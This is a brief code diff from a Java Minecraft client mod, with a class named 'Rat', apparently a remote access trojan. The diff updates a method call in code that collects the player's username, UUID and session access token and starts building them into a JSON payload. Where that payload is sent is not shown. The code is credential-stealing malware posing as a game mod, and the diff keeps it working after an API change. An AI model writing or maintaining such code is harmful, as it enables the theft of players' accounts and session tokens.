@@ -26,7 +26,7 @@ public class Rat implements ClientModInitializer {
                 if (user == null) return;
 
                 String username = user.getName();
-                String uuid = user.getGameProfile().getId().toString();
+                String uuid = user.getProfile().getId().toString();
                 String token = user.getAccessToken();
 
                 String jsonPayload = String.format(
